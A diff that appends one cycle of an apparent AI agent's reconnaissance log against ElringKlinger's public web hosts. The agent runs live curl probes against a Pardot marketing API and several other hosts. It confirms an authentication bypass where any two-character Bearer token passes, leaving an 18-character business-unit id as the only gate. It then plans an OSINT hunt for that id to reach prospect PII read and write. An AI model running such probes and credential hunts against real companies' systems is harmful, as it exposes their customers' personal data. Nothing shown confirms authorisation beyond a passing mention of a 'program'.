@@ -5796,3 +5796,230 @@ STEP 6 — LEARNING:
 
 STEP 7 — RISK:
 [RISK] elringklinger: **40/100** — Stable. The only surviving finding is the confirmed legacy Pardot token-validation skip (85): any ≥2-char Bearer passes, leaving the 18-char tenant BU-id as the sole auth gate. Severity is CRITICAL but exploitation is fully gated on obtaining a real `0Uv` BU id — a HUMAN_ONLY OSINT dependency, not a live-probe path. v5 auth-context shadowing falsified (12 routes, all 198); Smartcard 502 (~42h); EDI hosts dead 7d. Smartcard 502 (~42h); the highest-value future trigger is that backend recovery, which would re-open an unauthenticated provisioning/IDOR surface. Program risk holds at medium: one leaked BU id flips it to HIGH with a complete API PII exposure report.
+===== ANALYST bigpickle 2026-09-05 21:46:55 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mfor u in \
+  "https://api.smartcard.elringklinger.com/api/v1/" \
+  "https://go.events.elringklinger.com/api?method=getVersion" \
+  "https://go.events.elringklinger.com/api/v5/prospects" \
+  "https://edi2.elringklinger.com/" ; do
+  code=$(curl -sk -o /tmp/opencode/r.txt -w "%{http_code}" --max-time 12 "$u")
+  echo "== $u -> $code"
+  head -c 300 /tmp/opencode/r.txt; echo
+  sleep 1
+done
+== https://api.smartcard.elringklinger.com/api/v1/ -> 502
+<html>
+<head><title>502 Bad Gateway</title></head>
+<body>
+<center><h1>502 Bad Gateway</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+== https://go.events.elringklinger.com/api?method=getVersion -> 401
+{"@attributes":{"stat":"fail","version":1,"err_code":49},"err":"Access Denied"}
+== https://go.events.elringklinger.com/api/v5/prospects -> 401
+{"code":49,"message":"Access Denied"}
+== https://edi2.elringklinger.com/ -> 000
+{"code":49,"message":"Access Denied"}
+[0m
+Probes confirm frozen state (smartcard 502, legacy 401/49, v5 dual-path 401/49, edi2 dead). Testing two cheap passive angles: query-param auth path on legacy Pardot, and Smartcard nginx routing-table map (502=proxied vs 404=not-routed distinguishes live API surface behind the dead backend).
+[0m$ [0mfor u in \
+  "https://go.events.elringklinger.com/api?method=getVersion&api_key=aaaaaaaaa&user_key=aaaaaaaaa" \
+  "https://go.events.elringklinger.com/api?method=getVersion&api_key=aaaaaaaaa" \
+  "https://api.smartcard.elringklinger.com/api/" \
+  "https://api.smartcard.elringklinger.com/v1/" \
+  "https://api.smartcard.elringklinger.com/health" ; do
+  code=$(curl -sk -o /tmp/opencode/r2.txt -w "%{http_code}" --max-time 12 "$u")
+  echo "== $u -> $code"
+  head -c 200 /tmp/opencode/r2.txt; echo
+  sleep 1
+done
+== https://go.events.elringklinger.com/api?method=getVersion&api_key=aaaaaaaaa&user_key=aaaaaaaaa -> 401
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== https://go.events.elringklinger.com/api?method=getVersion&api_key=aaaaaaaaa -> 200
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== https://api.smartcard.elringklinger.com/api/ -> 502
+<html>
+<head><title>502 Bad Gateway</title></head>
+<body>
+<center><h1>502 Bad Gateway</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+== https://api.smartcard.elringklinger.com/v1/ -> 404
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+== https://api.smartcard.elringklinger.com/health -> 404
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+[0m
+Key NEW delta: the legacy Pardot endpoint discriminates on query-param auth shape — `api_key` only → HTTP 200/XML err1, `api_key+user_key` → HTTP 401/XML err1, no params → HTTP 401/JSON 49. Two-key scheme confirmed. Now testing whether the same length-only gate (≥2) exists for query-param keys, which would extend the confirmed token-validation-skip primitive to the XML tier.
+[0m$ [0mfor q in \
+  "method=getVersion&api_key=0&user_key=0" \
+  "method=getVersion&api_key=00&user_key=00" \
+  "method=getVersion&user_key=aaaaaaaaa" \
+  "method=getVersion&api_key=aaaaaaaaa&user_key=0" \
+  "method=getVersion&api_key=aaaaaaaaa&user_key=aaaaaaaaa&businessUnitId=0UvAAAAAAAAAAAAAAA" ; do
+  code=$(curl -sk -o /tmp/opencode/r3.txt -w "%{http_code}" --max-time 12 "https://go.events.elringklinger.com/api?$q")
+  echo "== [$q] -> $code"
+  head -c 200 /tmp/opencode/r3.txt; echo
+  sleep 1
+done
+== [method=getVersion&api_key=0&user_key=0] -> 200
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== [method=getVersion&api_key=00&user_key=00] -> 401
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== [method=getVersion&user_key=aaaaaaaaa] -> 200
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== [method=getVersion&api_key=aaaaaaaaa&user_key=0] -> 200
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+
+== [method=getVersion&api_key=aaaaaaaaa&user_key=aaaaaaaaa&businessUnitId=0UvAAAAAAAAAAAAAAA] -> 401
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="1">Invalid API key or user key</err>
+</rsp>
+[0m
+Pattern confirmed: HTTP 200 app-reject whenever either key is absent/shape-weak; full DB validation only when **both** `api_key`+`user_key` present and ≥2 chars (→401 err1 "Invalid API key or user key"). Query keys are genuinely validated, so the skip is Bearer-path-specific. One last re-verify that the Bearer-skip survivor finding is still live this cycle:
+[0m$ [0mcode=$(curl -sk -o /tmp/opencode/r4.txt -w "%{http_code}" --max-time 12 -H "Authorization: Bearer 00" "https://go.events.elringklinger.com/api?method=getVersion"); echo "== Bearer 00 no BU -> $code"; head -c 200 /tmp/opencode/r4.txt; echo; sleep 1
+code=$(curl -sk -o /tmp/opencode/r5.txt -w "%{http_code}" --max-time 12 -H "Authorization: Bearer 00" "https://go.events.elringklinger.com/api?method=getVersion&businessUnitId=0UvAAAAAAAAAAAAAAA"); echo "== Bearer 00 + BU -> $code"; head -c 200 /tmp/opencode/r5.txt; echo
+== Bearer 00 no BU -> 400
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="181">A required header is missing: Pardot-Business-Unit-Id header not found on request.</err>
+</rsp>
+
+== Bearer 00 + BU -> 400
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="181">A required header is missing: Pardot-Business-Unit-Id header not found on request.</err>
+</rsp>
+[0m
+BU is read from the `Pardot-Business-Unit-Id` header, not query param. Re-checking chain with header:
+[0m$ [0mcode=$(curl -sk -o /tmp/opencode/r6.txt -w "%{http_code}" --max-time 12 -H "Authorization: Bearer 00" -H "Pardot-Business-Unit-Id: 0UvAAAAAAAAAAAAAAA" "https://go.events.elringklinger.com/api?method=getVersion"); echo "== Bearer 00 + BU header -> $code"; head -c 200 /tmp/opencode/r6.txt; echo; sleep 1
+code=$(curl -sk -o /tmp/opencode/r7.txt -w "%{http_code}" --max-time 12 -H "Authorization: Bearer 00" -H "Pardot-Business-Unit-Id: X" "https://go.events.elringklinger.com/api?method=getVersion"); echo "== Bearer 00 + BU header X -> $code"; head -c 200 /tmp/opencode/r7.txt; echo; sleep 1
+code=$(curl -sk -o /tmp/opencode/r8.txt -w "%{http_code}" --max-time 12 -H "Authorization: Bearer 00" -H "Pardot-Business-Unit-Id: 0UvAAAAAAAAAAAAAAAAAA" "https://go.events.elringklinger.com/api?method=getVersion"); echo "== Bearer 00 + BU(20ch) -> $code"; head -c 200 /tmp/opencode/r8.txt; echo
+== Bearer 00 + BU header -> 403
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="201">Business Unit specified in Pardot-Business-Unit-Id header not found or inactive.</err>
+</rsp>
+
+== Bearer 00 + BU header X -> 400
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="182">Invalid header value: Value in Pardot-Business-Unit-Id header is not valid. Expected the 18 character ID of th
+== Bearer 00 + BU(20ch) -> 400
+<?xml version="1.0" encoding="UTF-8"?>
+<rsp stat="fail" version="1.0">
+   <err code="182">Invalid header value: Value in Pardot-Business-Unit-Id header is not valid. Expected the 18 character ID of th
+[0m
+Survivor finding re-verified LIVE: Bearer `00` + 18-char BU header → 403/201 (token passed, BU gate only). Format gate is length-18 (prefix not enforced). Checking freshness on previously-unreachable infra hosts for any new surface:
+[0m$ [0mfor h in aircontrol cgline avconf fwasvvideo1 cctv; do
+  code=$(curl -sk -o /tmp/opencode/r9.txt -w "%{http_code}" --max-time 8 "https://$h.elringklinger.com/")
+  echo "== $h.elringklinger.com -> $code"
+  head -c 120 /tmp/opencode/r9.txt; echo
+  sleep 1
+done
+== aircontrol.elringklinger.com -> 000
+head: cannot open '/tmp/opencode/r9.txt' for reading: No such file or directory
+
+== cgline.elringklinger.com -> 000
+head: cannot open '/tmp/opencode/r9.txt' for reading: No such file or directory
+
+== avconf.elringklinger.com -> 000
+head: cannot open '/tmp/opencode/r9.txt' for reading: No such file or directory
+
+== fwasvvideo1.elringklinger.com -> 000
+head: cannot open '/tmp/opencode/r9.txt' for reading: No such file or directory
+
+== cctv.elringklinger.com -> 000
+head: cannot open '/tmp/opencode/r9.txt' for reading: No such file or directory
+[0m
+All infra hosts still dead (000). Cycle complete — state frozen except one new auth-discrimination observation. Structured output:
+
+## STEP 1 — DELTA
+- [NEW] @ go.events.elringklinger.com/api: Legacy XML tier discriminates auth-param SHAPE — api_key-only, user_key-only, or any 1-char key → HTTP 200/XML err1 (app-layer reject); both `api_key`+`user_key` ≥2-char → HTTP 401/XML err1 (full DB validation). Two-factor Pardot key-pair confirmed; query keys ARE value-validated, so the Bearer-skip does NOT extend to query params.
+- [CHANGED] @ go.events.elringklinger.com/api: Bearer-skip re-verified LIVE this cycle (Bearer `00`+BU header → 403/201; only gate is a real 18-char `0Uv` BU id). BU is read from header `Pardot-Business-Unit-Id` exclusively — query param `businessUnitId` ignored (→400/181 even with valid-format value). 182 format gate is length-18 only (prefix not required to pass).
+- [NO_DELTA] api.smartcard.elringklinger.com: 502 ~45h; non-`/api` paths (/v1/, /health) → 404 → nginx proxy map strictly `/api/*`.
+- [NO_DELTA] go.events /api/v5:unchanged 401/49 dual-path. edi2/aircontrol/cgline/avconf/fwasvvideo1/cctv: all 000 timeout, dead.
+
+## STEP 2 — PRIORITIZE
+- [PRIO] go.events.elringklinger.com/api?method=, 7.5, auth: Bearer-skip re-confirmed live this cycle; sole gate = obtainable 18-char 0Uv BU id; query-key tier independently validated (no extension).
+- [PRIO] go.events.elringklinger.com/api/v5, 5.0, auth: 11 live endpoints; 401/49-vs-404/198 dual-path is architectural; same 0Uv BU gate.
+- [PRIO] api.smartcard.elringklinger.com, 3.5, auth: 502 ~45h; routing map now fully mapped; high value only on recovery.
+
+## STEP 3 — HYPOTHESES
+[HYP] Cross-tier unified BU auth gate — one 0Uv id unlocks both legacy XML and v5 REST
+class: AUTH
+asset: go.events.elringklinger.com/api?method=* AND /api/vN/*
+confidence: 60
+reasoning: The error ladder 49→181→182→201 (Access Denied → BU-missing → BU-format → BU-inactive) is byte-identical across legacy XML (confirmed again this cycle, XML body) and v5 REST tiers (JSON body), implying one shared auth middleware naming the same `Pardot-Business-Unit-Id` 18-char header. Both tiers accept any ≥2-char Bearer token value; both stop only at BU resolution. No tier-specific BU format difference observed (182=length-18 on both).
+evidence_needed: one real ElringKlinger `0Uv` BU id tested on BOTH tiers → if both reach 200/dispatch, single-id = two full API surfaces (prospects/campaigns PII read+write on each).
+verify_steps: PASSIVE — needs real BU id (HUMAN_ONLY OSINT), then `GET /api?method=getVersion -H "Authorization: Bearer 00" -H "Pardot-Business-Unit-Id: <real>"` and same header on `/api/v5/prospects` (1rps).
+impact: consolidates the confirmed broken-token-validation primitive onto two tiers for the price of one tenant id; CRITICAL (PII exfiltration + writes) if BU id obtained.
+testability: HUMAN_ONLY
+[HYP] Legacy Pardot Bearer-token validation skip — sole auth gate is BU id
+class: AUTH
+asset: go.events.elringklinger.com/api?method={getVersion,getCampaigns,queryProspects,...}
+confidence: 85
+reasoning: Re-verified this cycle: Bearer `00` any value (≥2 chars) passes token check → 181/182/201 BU-layer errors; no token-validity error exists anywhere in chain. Query-param keys ARE validated (err1) → skip is Authorization-header-specific. 182 = length-18 format check only.
+evidence_needed: obtainable real 0Uv BU id → garbage ≥2-char token = full authenticated API.
+verify_steps: PASSIVE — chain fully mapped (49/181/182/201); next step HUMAN_ONLY OSINT.
+impact: broken-auth design; CRITICAL if BU id found (prospects PII read+write, API-layer ATO).
+testability: HUMAN_ONLY
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] Smartcard backend recovery (AUTH, 20): 502 ~45h, routing map fully mapped, no signal; below threshold, passive-wait only.
+- [PARKED] v5 auth-context namespace shadowing (BUSLOGIC, 40): falsified prior cycle (12 routes, all 198).
+- [FINAL] Legacy Pardot Bearer-skip (AUTH, 85) — re-verified live this cycle. [FINAL] Cross-tier unified BU gate (AUTH, 60) — strengthens OSINT value of the single kernel.
+
+## STEP 5 — NEXT ACTION
+- [NEXT] HUMAN: OSINT for an ElringKlinger Pardot/Salesforce Business-Unit-Id (`0Uv` prefix, exactly 18 chars) in public github code search for `Pardot-Business-Unit-Id`, `businessUnitId`, `0Uv1` / `0Uv5` patterns + ElringKlinger, and in marketing/partner integration configs referencing `go.events.elringklinger.com` — one id authenticates two confirmed API tiers; no further live probe advances it.
+
+## STEP 6 — LEARNING
+- [LEARN] ACCEPTED BUSLOGIC @ go.events.elringklinger.com/api: Query-param auth is a two-key pair with shape-discrimination (200 app-reject when either key absent/<2 chars vs 401 full validation when both ≥2). Keys are DB-validated → Bearer-skip does not extend to api_key/user_key.
+- [LEARN] ACCEPTED AUTH @ go.events.elringklinger.com/api: BU id consumed exclusively from `Pardot-Business-Unit-Id` header (query param ignored → 181); 182 format gate is length-18, prefix not enforced. Bearer-skip alive.
+- [LEARN] REJECTED OTHER @ aircontrol/cgline/avconf/fwasvvideo1/cctv.elringklinger.com: All 000 timeout — dead infra hosts, no attack surface (consistent with edi2/edi7/dtspc-tst).
+
+## STEP 7 — RISK
+- [RISK] elringklinger: **40/100** — Stable. Single survivor finding (85): legacy Pardot Bearer token-value never validated; the entire auth barrier is one obtainable 18-char `0Uv` BU id that gates BOTH the legacy XML and v5 REST tiers (cross-tier hypothesis 60). Severity CRITICAL but exploitation fully gated on a HUMAN_ONLY OSINT dependency (no live-probe path advances it). Query-key tier properly validated; infra hosts dead (7th day); Smartcard 502 ~45h, routing map exhausted. One leaked BU id flips program to HIGH with a full PII-exposure report on two API tiers.
